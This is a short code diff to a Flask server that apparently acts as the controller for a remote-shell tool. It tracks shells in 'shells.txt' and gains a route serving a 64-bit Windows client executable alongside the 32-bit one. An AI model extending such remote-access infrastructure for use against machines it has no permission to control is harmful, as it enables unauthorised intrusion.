@@ -18,16 +18,26 @@ DEFAULT_PORT = 8443
 DEFAULT_SSL_FLAG = True
 
 shells_filename = 'shells.txt'
-client_win32_executable_file = './dist/client.exe'
+client_win32_executable_file = './dist/client86.exe'
+client_win64_executable_file = './dist/client64.exe'
 
 
-@app.route('/client.exe')
+@app.route('/client86.exe')
 def client_win32():
     if current_dir and current_user:
         return forbidden()
     print("{remote_addr} - downloading a win32 client executable"
           .format(remote_addr=request.remote_addr))
     return send_file(client_win32_executable_file)
+
+@app.route('/client64.exe')
+def client_win64():
+    if current_dir and current_user:
+        return forbidden()
+    print("{remote_addr} - downloading a win64 client executable"
+          .format(remote_addr=request.remote_addr))
+    return send_file(client_win64_executable_file)
+
 
 
 @app.route('/init')
